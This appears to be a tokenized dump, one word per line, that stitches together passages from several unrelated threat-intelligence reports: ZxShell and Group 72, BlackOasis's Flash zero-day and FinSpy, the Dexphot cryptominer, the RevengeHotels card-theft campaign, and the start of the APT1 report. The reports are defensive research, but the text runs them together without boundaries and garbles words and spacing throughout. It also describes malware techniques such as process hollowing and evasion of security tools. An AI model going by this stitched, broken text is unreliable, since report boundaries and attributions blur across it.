 
So
much
so
that
Microsoft
did
a
takedown
in
2012
.
 
A
similar
service
,
vicp.net
,
is
also
seen
in
many
of
the
domains
.
 
In
the
malware
,
if
a
domain
is
configured
,
it
will
retrieve
domain.tld
/
myIP
.
 
txt
.
 
This
file
contains
a
list
of
IP
addresses
for
the
infected
machine
to
connect
back
to
.
 
Otherwise
,
if
an
IP
address
is
configured
,
it
will
connect
directly
to
that
IP
address
.
 
We
have
written
a
simple
C++
ZxShell
Server
that
implements
the
communication
and
the
handshake
for
the
version
3.10
and
3.20
of
the
ZxShell
DLL
.
 
The
implementation
is
quite
simple
:
After
the
handshake
,
2
threads
that
deal
with
data
transfer
are
spawned
.
 
Advanced
persistent
threats
will
remain
a
problem
for
companies
and
organizations
of
all
sizes
,
especially
those
with
high
financial
or
intellectual
property
value
.
 
Group
72
s
involvement
in
Operation
SMN
is
another
example
of
what
sort
of
damage
that
can
be
done
if
organizations
are
not
diligent
in
their
efforts
to
secure
their
networks
.
 
ZxShell
is
one
sample
amongst
several
tools
that
Group
72
used
within
their
campaign
.
 
ZxShell
is
a
sophisticated
tool
employed
by
Group
72
that
contains
all
kinds
of
functionality
.
 
Its
detection
and
removal
can
be
difficult
due
to
the
various
techniques
used
to
conceal
its
presence
,
such
as
disabling
the
host
anti-virus
,
masking
its
installation
on
a
system
with
a
valid
service
name
,
and
by
masking
outbound
traffic
as
originating
from
a
web
browser
.
 
While
other
techniques
are
also
utilized
to
conceal
and
inhibit
its
removal
,
ZxShell
s
primary
functionality
is
to
act
as
a
Remote
Administration
Tool
(
RAT
)
,
allowing
the
threat
actor
to
have
continuous
backdoor
access
on
to
the
compromised
machine
.
 
As
our
analysis
demonstrates
,
ZxShell
is
an
effective
tool
that
can
be
ultimately
used
to
steal
user
credentials
and
other
highly
valuable
information
.
 
The
threat
posed
by
ZxShell
to
organizations
is
one
that
cannot
be
ignored
.
 
Organizations
with
high
financial
or
intellectual
property
value
should
take
the
time
to
ensure
their
security
requirements
are
met
and
that
employee
s
are
educated
about
the
security
threats
their
organizations
face
.
 
Threat
Spotlight
:
Group
72
,
Opening
the
ZxShell
.
 
A
well-funded
,
highly
active
group
of
Middle
Eastern
hackers
was
caught
,
yet
again
,
using
a
lucrative
zero-day
exploit
in
the
wild
to
break
into
computers
and
infect
them
with
powerful
spyware
developed
by
an
infamous
cyberweapons
dealer
named
Gamma
Group
.
 
The
incident
,
as
described
by
security
researchers
with
Moscow-based
cybersecurity
firm
Kaspersky
Lab
,
shines
a
rare
light
on
the
opaque
although
apparently
vibrant
market
for
software
exploits
and
spyware
,
which
in
this
case
appears
to
have
been
purchased
by
a
nation-state
.
 
The
Middle
Eastern
hacker
group
in
this
case
is
codenamed
BlackOasis
.
 
Kaspersky
found
the
group
was
exploiting
a
Adobe
Flash
Player
zero-day
vulnerability
(
CVE-2016-4117
)
to
remotely
deliver
the
latest
version
of
FinSpy
malware
,
according
to
a
new
blog
post
published
Monday
.
 
Adobe
issued
a
fix
Monday
to
its
users
in
the
form
of
a
software
update
.
 
FinSpy
,
a
final-stage
payload
that
allows
for
an
attacker
to
covertly
learn
what
a
target
is
talking
about
and
who
they
are
communicating
with
,
is
associated
with
Gamma
Group
which
goes
by
other
names
,
including
FinFisher
and
Lench
IT
Solutions
.
 
BlackOasis
in
recent
months
sent
a
wave
of
phishing
emails
.
 
These
emails
contained
malicious
Microsoft
Word
documents
with
the
aforementioned
Flash
Player
zero-day
hidden
inside
an
embedded
ActiveX
object
.
 
In
the
past
,
BlackOasis
messages
were
designed
to
appear
like
news
articles
from
2016
about
political
relations
between
Angola
and
China
.
 
The
term
zero-day
is
indicative
of
a
software
flaw
that
remains
unknown
to
the
software
s
creator
.
 
Zero-days
can
be
highly
disruptive
because
they
provide
a
window
of
time
for
an
attacker
to
breach
victims
before
the
vendor
is
able
to
apply
a
software
update
to
address
the
specific
security
hole
.
 
U.S
.
 
cybersecurity
firm
FireEye
also
recently
captured
BlackOasis
activity
as
part
of
a
similar
incident
where
the
group
relied
on
a
different
zero-day
exploit
more
specifically
,
a
SOAP
WSDL
parser
code
injection
vulnerability
to
install
FinSpy
onto
a
small
number
of
devices
.
 
Again
,
the
attacker
s
intention
appeared
to
be
espionage
.
 
Unlike
other
FinFisher
customers
or
users
who
focus
mostly
on
domestic
operations
,
BlackOasis
focuses
on
external
operations
and
go
after
a
wide
range
of
targets
around
the
world
,
explained
Costin
Raiu
,
director
of
the
global
research
and
analysis
team
at
Kaspersky
Lab
.
 
Gamma
Group
has
been
accused
of
selling
its
products
to
authoritarian
regimes
that
can
use
the
technology
to
both
track
dissidents
and
conduct
foreign
espionage
over
the
internet
.
 
The
discovery
by
Kaspersky
marks
at
least
the
fifth
zero-day
exploit
used
by
BlackOasis
and
exposed
by
security
researchers
since
June
2015
.
 
It
s
unclear
whether
the
hackers
are
purchasing
the
exploits
and
spyware
together
,
directly
from
Gamma
Group
,
or
if
they
were
able
to
acquire
some
of
the
tools
through
other
avenues
.
 
BlackOasis
interests
span
a
wide
gamut
of
figures
involved
in
Middle
Eastern
politics
and
verticals
disproportionately
relevant
to
the
region
.
 
This
includes
prominent
figures
in
the
United
Nations
,
opposition
bloggers
and
activists
,
and
regional
news
correspondents
,
a
blogpost
about
Kaspersky
s
findings
reads
.
 
The
post
continues
,
during
2016
,
we
observed
a
heavy
interest
in
Angola
,
exemplified
by
lure
documents
indicating
targets
with
suspected
ties
to
oil
,
money
laundering
,
and
other
illicit
activities
.
 
There
is
also
an
interest
in
international
activists
and
think
tanks
Victims
of
BlackOasis
have
been
observed
in
the
following
countries
:
Russia
,
Iraq
,
Afghanistan
,
Nigeria
,
Libya
,
Jordan
,
Tunisia
,
Saudi
Arabia
,
Iran
,
Netherlands
,
Bahrain
,
United
Kingdom
and
Angola
.
 
Intent
was
clearly
espionage
in
many
cases
,
going
outside
of
that
"lawful
surveillance"
boundary.
Brian
Bartholomew
(
@Mao_Ware
)
October
16,
2017
Brian
Bartholomew
,
a
senior
security
researcher
with
Kaspersky
,
said
on
Twitter
that
BlackOasis
espionage
included
non-traditional
targets
going
outside
of
that
lawful
surveillance
boundary.
An
advanced
persistent
threat
group
,
previously
identified
by
Microsoft
and
codenamed
Neodymium
,
is
closely
associated
with
BlackOasis
operations
.
 
Last
year
,
Microsoft
researchers
described
Neodymium
s
behavior
as
unusual
:
unlike
many
activity
groups
,
which
typically
gather
information
for
monetary
gain
or
economic
espionage
,
PROMETHIUM
and
NEODYMIUM
appear
to
launch
campaigns
simply
to
gather
information
about
certain
individuals
.
 
These
activity
groups
are
also
unusual
in
that
they
use
the
same
zero-day
exploit
to
launch
attacks
at
around
the
same
time
in
the
same
region
.
 
Their
targets
,
however
,
appear
to
be
individuals
that
do
not
share
common
affiliations.
A
cursory
review
of
BlackOasis
espionage
campaign
suggests
there
is
some
overlap
between
the
group
s
actions
and
Saudi
Arabia
s
geopolitical
interests
.
 
For
example
,
the
targeting
of
Angolan
organizations
in
mid-2016
coincidences
directly
with
the
rise
of
Angola
s
oil
business
with
China
,
which
displaced
Saudi
Arabia
as
the
number
one
exporter
of
crude
oil
to
China
at
the
time
.
 
All
13
countries
where
Kaspersky
reportedly
observed
BlackOasis
activity
are
connected
to
Saudi
Arabia
in
one
of
three
ways
:
economically
;
from
a
national
security
perspective
;
or
due
to
established
policy
agreements
.
 
In
addition
,
Saudi
Arabia
is
a
known
customer
of
spyware
and
has
used
the
technology
domestically
,
according
to
Citizen
Lab
,
a
cybersecurity
and
human-rights
focused
research
laboratory
.
 
Kaspersky
s
research
notes
that
BlackOasis
hacked
into
computers
based
in
Saudi
Arabia
.
 
Insights
from
one
year
of
tracking
a
polymorphic
threat
.
 
A
little
over
a
year
ago
,
in
October
2018
,
our
polymorphic
outbreak
monitoring
system
detected
a
large
surge
in
reports
,
indicating
that
a
large-scale
campaign
was
unfolding
.
 
We
observed
as
the
new
threat
attempted
to
deploy
files
that
changed
every
20-30
minutes
on
thousands
of
devices
.
 
We
gave
the
threat
the
name
Dexphot
,
based
on
certain
characteristics
of
the
malware
code
.
 
The
Dexphot
attack
used
a
variety
of
sophisticated
methods
to
evade
security
solutions
.
 
Layers
of
obfuscation
,
encryption
,
and
the
use
of
randomized
file
names
hid
the
installation
process
.
 
Dexphot
then
used
fileless
techniques
to
run
malicious
code
directly
in
memory
,
leaving
only
a
few
traces
that
can
be
used
for
forensics
.
 
It
hijacked
legitimate
system
processes
to
disguise
malicious
activity
.
 
If
not
stopped
,
Dexphot
ultimately
ran
a
cryptocurrency
miner
on
the
device
,
with
monitoring
services
and
scheduled
tasks
triggering
re-infection
when
defenders
attempt
to
remove
the
malware
.
 
In
the
months
that
followed
,
we
closely
tracked
the
threat
and
witnessed
the
attackers
upgrade
the
malware
,
target
new
processes
,
and
work
around
defensive
measures
.
 
While
Microsoft
Defender
Advanced
Threat
Protection
s
pre-execution
detection
engines
blocked
Dexphot
in
most
cases
,
behavior-based
machine
learning
models
provided
protection
for
cases
where
the
threat
slipped
through
.
 
Given
the
threat
s
persistence
mechanisms
,
polymorphism
,
and
use
of
fileless
techniques
,
behavior-based
detection
was
a
critical
component
of
the
comprehensive
protection
against
this
malware
and
other
threats
that
exhibit
similar
malicious
behaviors
.
 
Microsoft
Defender
ATP
data
shows
the
effectiveness
of
behavioral
blocking
and
containment
capabilities
in
stopping
the
Dexphot
campaign
.
 
Over
time
,
Dexphot-related
malicious
behavior
reports
dropped
to
a
low
hum
,
as
the
threat
lost
steam
.
 
Our
close
monitoring
of
Dexphot
helped
us
ensure
that
our
customers
were
protected
from
the
evolving
threat
.
 
More
importantly
,
one
year
s
worth
of
intelligence
helped
us
gain
insight
not
only
into
the
goals
and
motivations
of
Dexphot
s
authors
,
but
of
cybercriminals
in
general
.
 
The
early
stages
of
a
Dexphot
infection
involves
numerous
files
and
processes
.
 
During
the
execution
stage
,
Dexphot
writes
five
key
files
to
disk
:
1
An
installer
with
two
URLs
;
2
An
MSI
package
file
downloaded
from
one
of
the
URLs
;
3
A
password-protected
ZIP
archive
;
4
A
loader
DLL
,
which
is
extracted
from
the
archive
;
5
An
encrypted
data
file
that
holds
three
additional
executables
that
are
loaded
into
system
processes
via
process
hollowing
.
 
Except
for
the
installer
,
the
other
processes
that
run
during
execution
are
legitimate
system
processes
.
 
This
can
make
detection
and
remediation
more
difficult
.
 
These
legitimate
system
processes
include
msiexec.exe
(
for
installing
MSI
packages
)
,
unzIP
.
 
exe
(
for
extracting
files
from
the
password-protected
ZIP
archive
)
,
rundll32.exe
(
for
loading
the
loader
DLL
)
,
schtasks.exe
(
for
scheduled
tasks
)
,
powershell.exe
(
for
forced
updates
)
.
 
In
later
stages
,
Dexphot
targets
a
few
other
system
processes
for
process
hollowing
:
svchost.exe
,
tracert.exe
,
and
setup.exe
.
 
Based
on
Microsoft
Defender
ATP
signals
,
SoftwareBundler
:
Win32/ICLoader
and
its
variants
are
primarily
used
to
drop
and
run
the
Dexphot
installer
.
 
The
installer
uses
two
URLs
to
download
malicious
payloads
.
 
These
are
the
same
two
URLs
that
Dexphot
use
later
to
establish
persistence
,
update
the
malware
,
and
re-infect
the
device
.
 
The
installer
downloads
an
MSI
package
from
one
of
the
two
URLs
,
and
then
launches
msiexec.exe
to
perform
a
silent
install
.
 
This
is
the
first
of
several
instances
of
Dexphot
employing
living-off-the-land
techniques
,
the
use
of
legitimate
system
processes
for
nefarious
purposes
.
 
Dexphot
s
package
often
contains
an
obfuscated
batch
script
.
 
If
the
package
contains
this
file
,
the
script
is
the
first
thing
that
msiexec.exe
runs
when
it
begins
the
installation
process
.
 
The
said
obfuscated
script
is
designed
to
check
for
antivirus
products
.
 
Dexphot
halts
the
infection
process
immediately
if
an
antivirus
product
is
found
running
.
 
When
we
first
began
our
research
,
the
batch
script
only
checked
for
antivirus
products
from
Avast
and
AVG
.
 
Later
,
Windows
Defender
Antivirus
was
added
to
the
checklist
.
 
If
the
process
is
not
halted
,
Dexphot
decompresses
the
password-protected
ZIP
archive
from
the
MSI
package
.
 
The
password
to
this
archive
is
within
the
MSI
package
.
 
Along
with
the
password
,
the
malware
s
authors
also
include
a
clean
version
of
unzIP
.
 
exe
so
that
they
do
nt
have
to
rely
on
the
target
system
having
a
ZIP
utility
.
 
The
unzIP
.
 
exe
file
in
the
package
is
usually
named
various
things
,
such
as
z.exe
or
ex.exe
,
to
avoid
scrutiny
.
 
The
ZIP
archive
usually
contains
three
files
:
the
loader
DLL
,
an
encrypted
data
file
(
usually
named
bin.dat
)
,
and
,
often
,
one
clean
unrelated
DLL
,
which
is
likely
included
to
mislead
detection
.
 
Dexphot
usually
extracts
the
decompressed
files
to
the
target
system
s
Favorites
folder
.
 
The
files
are
given
new
,
random
names
,
which
are
generated
by
concatenating
words
and
numbers
based
on
the
time
of
execution
(
for
example
,
C:\Users\<user>\Favorites\\Res.Center.ponse\<numbers>
)
.
 
Msiexec.exe
next
calls
rundll32.exe
,
specifying
loader
DLL
(
urlmon.7z
in
the
example
above
)
in
order
to
decrypt
the
data
file
.
 
The
decryption
process
involves
ADD
and
XOR
operations
,
using
a
key
hardcoded
in
the
binary
.
 
The
decrypted
data
contains
three
executables
.
 
Unlike
the
files
described
earlier
,
these
executables
are
never
written
to
the
filesystem
.
 
Instead
,
they
exist
only
in
memory
,
and
Dexphot
runs
them
by
loading
them
into
other
system
processes
via
process
hollowing
.
 
Process
hollowing
is
a
technique
that
can
hide
malware
within
a
legitimate
system
process
.
 
It
replaces
the
contents
of
the
legitimate
process
with
malicious
code
.
 
Detecting
malicious
code
hidden
using
this
method
is
not
trivial
,
so
process
hollowing
has
become
a
prevalent
technique
used
by
malware
today
.
 
This
method
has
the
additional
benefit
of
being
fileless
:
the
code
can
be
run
without
actually
being
saved
on
the
file
system
.
 
Not
only
is
it
harder
to
detect
the
malicious
code
while
it
s
running
,
it
s
harder
to
find
useful
forensics
after
the
process
has
stopped
.
 
To
initiate
process
hollowing
,
the
loader
DLL
targets
two
legitimate
system
processes
,
for
example
svchost.exe
or
nslookup.exe
,
and
spawns
them
in
a
suspended
state
.
 
The
loader
DLL
replaces
the
contents
of
these
processes
with
the
first
and
second
decrypted
executables
.
 
These
executables
are
monitoring
services
for
maintaining
Dexphot
s
components
.
 
The
now-malicious
processes
are
released
from
suspension
and
run
.
 
Next
,
the
loader
DLL
targets
the
setup.exe
file
in
SysWoW64
.
 
It
removes
setup.exe
s
contents
and
replaces
them
with
the
third
decrypted
executable
,
a
cryptocurrency
miner
.
 
Although
Dexphot
always
uses
a
cryptocurrency
miner
of
some
kind
,
it
s
not
always
the
same
miner
.
 
It
used
different
programs
like
XMRig
and
JCE
Miner
over
the
course
of
our
research
.
 
The
two
monitoring
services
simultaneously
check
the
status
of
all
three
malicious
processes
.
 
Having
dual
monitoring
services
provides
redundancy
in
case
one
of
the
monitoring
processes
is
halted
.
 
If
any
of
the
processes
are
terminated
,
the
monitors
immediately
identify
the
situation
,
terminate
all
remaining
malicious
processes
,
and
re-infect
the
device
.
 
The
monitoring
components
also
detect
freshly
launched
cmd.exe
processes
and
terminate
them
promptly
.
 
As
a
final
fail-safe
,
Dexphot
uses
schtasks.exe
to
create
scheduled
tasks
.
 
This
persistence
technique
is
interesting
,
because
it
employs
two
distinct
MITRE
ATT&CK
techniques
:
Scheduled
Task
and
Signed
Binary
Proxy
Execution
.
 
The
scheduled
tasks
call
msiexec.exe
as
a
proxy
to
run
the
malicious
code
,
much
like
how
msiexec.exe
was
used
during
installation
.
 
Using
msiexec.exe
,
a
legitimate
system
process
,
can
make
it
harder
to
trace
the
source
of
malicious
activity
.
 
Furthermore
,
the
tasks
allow
Dexphot
to
conveniently
update
the
payload
from
the
web
every
time
the
tasks
run
.
 
They
automatically
update
all
of
Dexphot
s
components
,
both
upon
system
reboot
as
well
as
every
90
or
110
minutes
while
the
system
is
running
.
 
Dexphot
also
generates
the
names
for
the
tasks
at
runtime
,
which
means
a
simple
block
list
of
hardcoded
task
names
will
not
be
effective
in
preventing
them
from
running
.
 
The
names
are
usually
in
a
GUID
format
,
although
after
we
released
our
first
round
of
Dexphot-blocking
protections
,
the
threat
authors
began
to
use
random
strings
.
 
The
threat
authors
have
one
more
evasion
technique
for
these
scheduled
tasks
:
some
Dexphot
variants
copy
msiexec.exe
to
an
arbitrary
location
and
give
it
a
random
name
,
such
as
%AppData%\<random>.exe
.
 
This
makes
the
system
process
running
malicious
code
a
literal
moving
target
.
 
Dexphot
exhibits
multiple
layers
of
polymorphism
across
the
binaries
it
distributes
.
 
For
example
,
the
MSI
package
used
in
the
campaign
contains
different
files
,
as
shown
in
the
table
below
.
 
The
MSI
packages
generally
include
a
clean
version
of
unzIP
.
 
exe
,
a
password-protected
ZIP
file
,
and
a
batch
file
that
checks
for
currently
installed
antivirus
products
.
 
However
,
the
batch
file
is
not
always
present
,
and
the
names
of
the
ZIP
files
and
Loader
DLLs
,
as
well
as
the
password
for
extracting
the
ZIP
file
,
all
change
from
one
package
to
the
next
.
 
In
addition
,
the
contents
of
each
Loader
DLL
differs
from
package
to
package
,
as
does
the
encrypted
data
included
in
the
ZIP
file
.
 
This
leads
to
the
generation
of
a
different
ZIP
archive
and
,
in
turn
,
a
unique
MSI
package
,
each
time
the
attacker
bundles
the
files
together
.
 
Because
of
these
carefully
designed
layers
of
polymorphism
,
a
traditional
file-based
detection
approach
wouldnt
be
effective
against
Dexphot
.
 
Besides
tracking
the
files
and
processes
that
Dexphot
uses
to
execute
an
attack
,
we
have
also
been
monitoring
the
domains
used
to
host
malicious
payloads
.
 
The
URLs
used
for
hosting
all
follow
a
similar
pattern
.
 
The
domain
address
usually
ends
in
a
.info
or
.net
TLD
,
while
the
file
name
for
the
actual
payload
consists
of
random
characters
,
similar
to
the
randomness
previously
seen
being
used
to
generate
file
names
and
scheduled
tasks
.
 
Many
of
the
URLs
listed
were
in
use
for
an
extended
period
.
 
However
,
the
MSI
packages
hosted
at
each
URL
are
frequently
changed
or
updated
.
 
In
addition
,
every
few
days
more
domains
are
generated
to
host
more
payloads
.
 
After
a
few
months
of
monitoring
,
we
were
able
to
identify
around
200
unique
Dexphot
domains
.
 
Dexphot
is
not
the
type
of
attack
that
generates
mainstream
media
attention
;
it
s
one
of
the
countless
malware
campaigns
that
are
active
at
any
given
time
.
 
Its
goal
is
a
very
common
one
in
cybercriminal
circles
to
install
a
coin
miner
that
silently
steals
computer
resources
and
generates
revenue
for
the
attackers
yet
Dexphot
exemplifies
the
level
of
complexity
and
rate
of
evolution
of
even
everyday
threats
,
intent
on
evading
protections
and
motivated
to
fly
under
the
radar
for
the
prospect
of
profit
.
 
To
combat
threats
,
several
next-generation
protection
engines
in
Microsoft
Defender
Advanced
Threat
Protection
s
antivirus
component
detect
and
stop
malicious
techniques
at
multiple
points
along
the
attack
chain
.
 
For
Dexphot
,
machine
learning-based
detections
in
the
cloud
recognize
and
block
the
DLLs
loaded
by
rundll32.exe
,
stopping
the
attack
chain
in
its
early
stages
.
 
Memory
scans
detect
and
terminate
the
loading
of
malicious
code
hidden
by
process
hollowing
including
the
monitoring
processes
that
attempt
to
update
the
malware
code
and
re-infect
the
machine
via
PowerShell
commands
.
 
Behavioral
blocking
and
containment
capabilities
are
especially
effective
in
defeating
Dexphot
s
fileless
techniques
,
detection
evasion
,
and
persistence
mechanisms
,
including
the
periodic
and
boot-time
attempts
to
update
the
malware
via
scheduled
tasks
.
 
As
mentioned
,
given
the
complexity
of
the
attack
chain
and
of
Dexphot
s
persistence
methods
,
we
released
a
remediation
solution
that
prevents
re-infection
by
removing
artifacts
.
 
The
detection
,
blocking
,
and
remediation
of
Dexphot
on
endpoints
are
exposed
in
Microsoft
Defender
Security
Center
,
where
Microsoft
Defender
ATP
s
rich
capabilities
like
endpoint
detection
and
response
,
automated
investigation
and
remediation
,
and
others
enable
security
operations
teams
to
investigate
and
remediate
attacks
in
enterprise
environments
.
 
With
these
capabilities
,
Microsoft
Defender
ATP
provides
comprehensive
protection
against
Dexphot
and
the
countless
other
complex
and
evolving
threats
that
we
face
every
day
.
 
Dexphot
:
72acaf9ff8a43c68416884a3fff3b23e749b4bb8fb39e16f9976643360ed391f
.
 
Dexphot
:
22beffb61cbdc2e0c3eefaf068b498b63a193b239500dab25d03790c467379e3
.
 
Dexphot
:
65eac7f9b67ff69cefed288f563b4d77917c94c410c6c6c4e4390db66305ca2a
.
 
Dexphot
:
ba9467e0d63ba65bf10650a3c8d36cd292b3f846983032a44a835e5966bc7e88
.
 
Dexphot
:
537d7fe3b426827e40bbdd1d127ddb59effe1e9b3c160804df8922f92e0b366e
.
 
Dexphot
:
504cc403e0b83233f8d20c0c86b0611facc040b868964b4afbda3214a2c8e1c5
.
 
Dexphot
:
aa5c56fe01af091f07c56ac7cbd240948ea6482b6146e0d3848d450977dff152
.
 
RevengeHotels
:
cybercrime
targeting
hotel
front
desks
worldwide
.
 
RevengeHotels
is
a
targeted
cybercrime
malware
campaign
against
hotels
,
hostels
,
hospitality
and
tourism
companies
,
mainly
,
but
not
exclusively
,
located
in
Brazil
.
 
We
have
confirmed
more
than
20
hotels
that
are
victims
of
the
group
,
located
in
eight
states
in
Brazil
,
but
also
in
other
countries
such
as
Argentina
,
Bolivia
,
Chile
,
Costa
Rica
,
France
,
Italy
,
Mexico
,
Portugal
,
Spain
,
Thailand
and
Turkey
.
 
The
goal
of
the
campaign
is
to
capture
credit
card
data
from
guests
and
travelers
stored
in
hotel
systems
,
as
well
as
credit
card
data
received
from
popular
online
travel
agencies
(
OTAs
)
such
as
Booking.com
.
 
The
main
attack
vector
is
via
email
with
crafted
Word
,
Excel
or
PDF
documents
attached
.
 
Some
of
them
exploit
CVE-2017-0199
,
loading
it
using
VBS
and
PowerShell
scripts
and
then
installing
customized
versions
of
RevengeRAT
,
NjRAT
,
NanoCoreRAT
,
888
RAT
and
other
custom
malware
such
as
ProCC
in
the
victim
s
machine
.
 
The
group
has
been
active
since
2015
,
but
increased
its
attacks
in
2019
.
 
In
our
research
,
we
were
also
able
to
track
two
groups
targeting
the
hospitality
sector
,
using
separate
but
similar
infrastructure
,
tools
and
techniques
.
 
PaloAlto
has
already
written
about
one
of
them
.
 
We
named
the
first
group
RevengeHotels
,
and
the
second
ProCC
.
 
These
groups
use
a
lot
of
social
engineering
in
their
attacks
,
asking
for
a
quote
from
what
appears
to
be
a
government
entity
or
private
company
wanting
to
make
a
reservation
for
a
large
number
of
people
.
 
Their
infrastructure
also
relies
on
the
use
of
dynamic
DNS
services
pointing
to
commercial
hosting
and
self-hosted
servers
.
 
They
also
sell
credentials
from
the
affected
systems
,
allowing
other
cybercriminals
to
have
remote
access
to
hotel
front
desks
infected
by
the
campaign
.
 
We
monitored
the
activities
of
these
groups
and
the
new
malware
they
are
creating
for
over
a
year
.
 
With
a
high
degree
of
confidence
,
we
can
confirm
that
at
least
two
distinct
groups
are
focused
on
attacking
this
sector
;
there
is
also
a
third
group
,
though
it
is
unclear
if
its
focus
is
solely
on
this
sector
or
if
carries
out
other
types
of
attacks
.
 
One
of
the
tactics
used
in
operations
by
these
groups
is
highly
targeted
spear-phishing
messages
.
 
They
register
typo-squatting
domains
,
impersonating
legitimate
companies
.
 
The
emails
are
well
written
,
with
an
abundance
of
detail
.
 
They
explain
why
the
company
has
chosen
to
book
that
particular
hotel
.
 
By
checking
the
sender
information
,
it
s
possible
to
determine
whether
the
company
actually
exists
.
 
However
,
there
is
a
small
difference
between
the
domain
used
to
send
the
email
and
the
real
one
.
 
This
spear-phishing
message
,
written
in
Portuguese
,
has
a
malicious
file
attached
misusing
the
name
of
a
real
attorney
office
,
while
the
domain
sender
of
the
message
was
registered
one
day
before
,
using
a
typo-squatting
domain
.
 
The
group
goes
further
in
its
social
engineering
effort
:
to
convince
the
hotel
personnel
about
the
legitimacy
of
their
request
,
a
copy
of
the
National
Registry
of
Legal
Entities
card
(
CNPJ
)
is
attached
to
the
quotation
.
 
The
attached
file
,
Reserva
Advogados
Associados.docx
(
Attorneys
Associates
Reservation.docx
)
,
is
a
malicious
Word
file
that
drops
a
remote
OLE
object
via
template
injection
to
execute
macro
code
.
 
The
macro
code
inside
the
remote
OLE
document
contains
PowerShell
commands
that
download
and
execute
the
final
payload
.
 
In
the
RevengeHotels
campaign
,
the
downloaded
files
are
.NET
binaries
protected
with
the
Yoda
Obfuscator
.
 
After
unpacking
them
,
the
code
is
recognizable
as
the
commercial
RAT
RevengeRAT
.
 
An
additional
module
written
by
the
group
called
ScreenBooking
is
used
to
capture
credit
card
data
.
 
It
monitors
whether
the
user
is
browsing
the
web
page
.
 
In
the
initial
versions
,
back
in
2016
,
the
downloaded
files
from
RevengeHotels
campaigns
were
divided
into
two
modules
:
a
backdoor
and
a
module
to
capture
screenshots
.
 
Recently
we
noticed
that
these
modules
had
been
merged
into
a
single
backdoor
module
able
to
collect
data
from
clipboard
and
capture
screenshots
.
 
In
this
example
,
the
webpage
that
the
attacker
is
monitoring
is
booking.com
(
more
specifically
,
the
page
containing
the
card
details
)
.
 
The
code
is
specifically
looking
for
data
in
Portuguese
and
English
,
allowing
the
attackers
to
steal
credit
card
data
from
web
pages
written
in
these
languages
.
 
In
the
ProCC
campaigns
,
the
downloaded
files
are
Delphi
binaries
.
 
The
backdoor
installed
in
the
machine
is
more
customized
than
that
used
by
RevengeHotels
:
it
s
developed
from
scratch
and
is
able
to
collect
data
from
the
clipboard
and
printer
spooler
,
and
capture
screenshots
.
 
Because
the
personnel
in
charge
of
confirming
reservations
usually
need
to
pull
credit
card
data
from
OTA
websites
,
it
s
possible
to
collect
card
numbers
by
monitoring
the
clipboard
and
the
documents
sent
to
the
printer
.
 
According
to
the
relevant
underground
forums
and
messaging
groups
,
these
criminals
also
infect
front
desk
machines
in
order
to
capture
credentials
from
the
hotel
administration
software
;
they
can
then
steal
credit
card
details
from
it
too
.
 
Some
criminals
also
sell
remote
access
to
these
systems
,
acting
as
a
concierge
for
other
cybercriminals
by
giving
them
permanent
access
to
steal
new
data
by
themselves
.
 
Some
Brazilian
criminals
tout
credit
card
data
extracted
from
a
hotel
s
system
as
high
quality
and
reliable
because
it
was
extracted
from
a
trusted
source
,
i.e.
,
a
hotel
administration
system
.
 
The
majority
of
the
victims
are
associated
with
the
hospitality
sector
.
 
Based
on
the
routines
used
,
we
estimate
that
this
attack
has
a
global
reach
.
 
Based
on
data
extracted
from
Bit.ly
statistics
,
we
can
see
that
potential
victims
from
many
other
countries
have
at
least
accessed
the
malicious
link
.
 
This
data
suggests
that
the
number
of
countries
with
potential
victims
is
higher
than
our
telemetry
has
registered
.
 
RevengeHotels
is
a
campaign
that
has
been
active
since
at
least
2015
,
revealing
different
groups
using
traditional
RAT
malware
to
infect
businesses
in
the
hospitality
sector
.
 
While
there
is
a
marked
interest
in
Brazilian
victims
,
our
telemetry
shows
that
their
reach
has
extended
to
other
countries
in
Latin
America
and
beyond
.
 
The
use
of
spear-phishing
emails
,
malicious
documents
and
RAT
malware
is
yielding
significant
results
for
at
least
two
groups
we
have
identified
in
this
campaign
.
 
Other
threat
actors
may
also
be
part
of
this
wave
of
attacks
,
though
there
is
no
confirmation
at
the
current
time
.
 
If
you
want
to
be
a
savvy
and
safe
traveler
,
it
s
highly
recommended
to
use
a
virtual
payment
card
for
reservations
made
via
OTAs
,
as
these
cards
normally
expire
after
one
charge
.
 
While
paying
for
your
reservation
or
checking
out
at
a
hotel
,
it
s
a
good
idea
to
use
a
virtual
wallet
such
as
Apple
Pay
,
Google
Pay
,
etc
.
 
RevengeHotels
:
74440d5d0e6ae9b9a03d06dd61718f66
.
 
RevengeHotels
:
e675bdf6557350a02f15c14f386fcc47
.
 
RevengeHotels
:
df632e25c32e8f8ad75ed3c50dd1cd47
.
 
RevengeHotels
:
a089efd7dd9180f9b726594bb6cf81ae
.
 
RevengeHotels
:
81701c891a1766c51c74bcfaf285854b
.
 
APT1
.
 
Since
2004
,
Mandiant
has
investigated
computer
security
breaches
at
hundreds
of
organizations
around
the
world.The
majority
of
these
security
breaches
are
attributed
to
advanced
threat
actors
referred
to
as
the
Advanced
Persistent
Threat
(
APT
)
.
 
We
first
published
details
about
the
APT
in
our
January
2010
M-Trends
report
.
 
As
we
stated
in
there
port
,
our
position
was
that
The
Chinese
government
may
authorize
this
activity
,
but
there
s
no
way
to
determine
the
extent
of
its
involvement.
Now
,
three
years
later
,
we
have
the
evidence
required
to
change
our
assessment
.
 
The
details
we
have
analyzed
during
hundreds
of
investigations
convince
us
that
the
groups
conducting
these
activities
are
based
primarily
in
China
and
that
the
Chinese
Government
is
aware
of
them
.
 
Mandiant
continues
to
track
dozens
of
APT
groups
around
the
world
;
however
,
this
report
is
focused
on
the
most
prolific
of
these
groups
.
 
We
refer
to
this
group
as
APT1
and
it
is
one
of
more
than
20
APT
groups
with
origins
inChina
.
 
APT1
is
a
single
organization
of
operators
that
has
conducted
a
cyber
espionage
campaign
against
a
broad
range
of
victims
since
at
least
2006
.
 
From
our
observations
,
it
is
one
of
the
most
prolific
cyber
espionage
groups
in
terms
of
the
sheer
quantity
of
information
stolen
.
 
The
scale
and
impact
of
APT1
s
operations
compelled
us
to
write
this
report
.
 
The
activity
we
have
directly
observed
likely
represents
only
a
small
fraction
of
the
cyber
espionage
that
APT1
has
conducted
.
 
Though
our
visibility
of
APT1
s
activities
is
incomplete
,
we
have
analyzed
the
group
s
intrusions
against
nearly
150
victims
over
seven
years
.
 
From
our
unique
vantage
point
responding
to
victims
,
we
tracked
APT1
back
to
four
large
networks
in
Shanghai
,
two
of
which
are
allocated
directly
to
the
Pudong
New
Area
.
 
We
uncovered
a
substantial
amount
of
APT1
s
attack
infrastructure
,
command
and
control
,
and
modus
operandi
(
tools
,
tactics
,
and
procedures
)
.
